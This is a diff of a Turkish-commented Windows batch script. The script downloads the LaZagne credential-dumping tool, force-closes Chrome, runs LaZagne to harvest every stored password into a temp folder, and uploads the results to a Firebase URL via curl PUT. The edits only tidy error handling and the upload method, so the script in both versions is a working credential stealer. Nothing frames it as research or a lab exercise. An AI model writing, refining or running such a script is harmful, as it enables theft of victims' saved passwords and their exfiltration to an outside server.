@@ -1,6 +1,7 @@
 @echo off
 setlocal enabledelayedexpansion
 
+:: Ayarlar
 set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZ_EXE=%TEMP%\lazagne.exe"
 set "RESULT_DIR=%TEMP%\results"
@@ -10,38 +11,38 @@ echo ------------------------------------------------------------
 echo [INFO] Script basladi: %DATE% %TIME%
 echo ------------------------------------------------------------
 
-:: Lazagne varsa kullan, yoksa indir
-if not exist "%LAZ_EXE%" (
-    echo [INFO] Lazagne.exe indiriliyor...
+:: Lazagne.exe varsa indirimi
+if exist "%LAZ_EXE%" (
+    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor.
+) else (
+    echo [INFO] Lazagne indiriliyor...
     powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
-    if %ERRORLEVEL% NEQ 0 (
-        echo [ERROR] LaZagne indirilemedi!
+    if errorlevel 1 (
+        echo [ERROR] Lazagne indirilemedi!
         pause
         exit /b 1
     )
-    echo [OK] LaZagne indirildi.
-) else (
-    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor.
+    echo [OK] Lazagne indirildi.
 )
 
-:: Chrome açık mı kontrol et ve kapat
-tasklist /FI "IMAGENAME eq chrome.exe" | find /I "chrome.exe" >nul
-if %ERRORLEVEL% EQU 0 (
+:: Chrome varsa kapat
+tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
+if errorlevel 1 (
+    echo [INFO] Chrome acik degil.
+) else (
     echo [INFO] Chrome calisiyor, kapatiliyor...
-    taskkill /IM chrome.exe /F
-    if %ERRORLEVEL% EQU 0 (
-        echo [OK] Chrome kapatildi.
-    ) else (
+    taskkill /IM chrome.exe /F >nul 2>&1
+    if errorlevel 1 (
         echo [WARN] Chrome kapatilamadi.
+    ) else (
+        echo [OK] Chrome kapatildi.
     )
-) else (
-    echo [INFO] Chrome calismiyor.
 )
 
-:: Sonuc klasoru varsa yoksa oluştur
+:: Sonuc klasoru olustur
 if not exist "%RESULT_DIR%" (
     mkdir "%RESULT_DIR%"
-    if %ERRORLEVEL% NEQ 0 (
+    if errorlevel 1 (
         echo [ERROR] Sonuc klasoru olusturulamadi!
         pause
         exit /b 1
@@ -49,24 +50,23 @@ if not exist "%RESULT_DIR%" (
 )
 echo [OK] Sonuc klasoru: %RESULT_DIR%
 
-:: Lazagne ile tum credential'lari al, sonucu dosyaya kaydet
-echo [INFO] Lazagne calistiriliyor...
-"%LAZ_EXE%" all > "%RESULT_DIR%\lazagne_results.txt"
-if %ERRORLEVEL% NEQ 0 (
-    echo [ERROR] Lazagne calistirilirken hata olustu!
+:: LaZagne ile tum credential’lari topla
+echo [INFO] LaZagne calistiriliyor...
+"%LAZ_EXE%" all -oN "%RESULT_DIR%\lazagne_results.txt"
+if errorlevel 1 (
+    echo [ERROR] LaZagne calistirilirken hata olustu.
     pause
     exit /b 1
 )
-echo [OK] Lazagne tamamlandi.
+echo [OK] LaZagne tamamlandi, cikti: %RESULT_DIR%\lazagne_results.txt
 
-:: Firebase'e yukle
+:: Sonuclarin Firebase'e yuklenmesi (curl ile)
 echo [INFO] Sonuclar Firebase'e yukleniyor...
+
 for %%F in ("%RESULT_DIR%\*") do (
     echo   -> Yukleniyor: %%~nxF
-    powershell -Command ^
-      "$content = Get-Content -Raw -Path '%%F'; ^
-       Invoke-RestMethod -Uri '%FIREBASE_URL%/%%~nxF.json' -Method PUT -Body $content"
-    if !ERRORLEVEL! NEQ 0 (
+    curl -X PUT -d @%%F "%FIREBASE_URL%/%%~nxF.json" --silent --show-error
+    if errorlevel 1 (
         echo [ERROR] %%~nxF yuklenemedi!
         pause
         exit /b 1
@@ -78,5 +78,6 @@ for %%F in ("%RESULT_DIR%\*") do (
 echo ------------------------------------------------------------
 echo [INFO] Tum islem tamamlandi: %DATE% %TIME%
 echo ------------------------------------------------------------
-pause
+echo Cikmak icin bir tusa basin...
+pause >nul
 exit /b 0
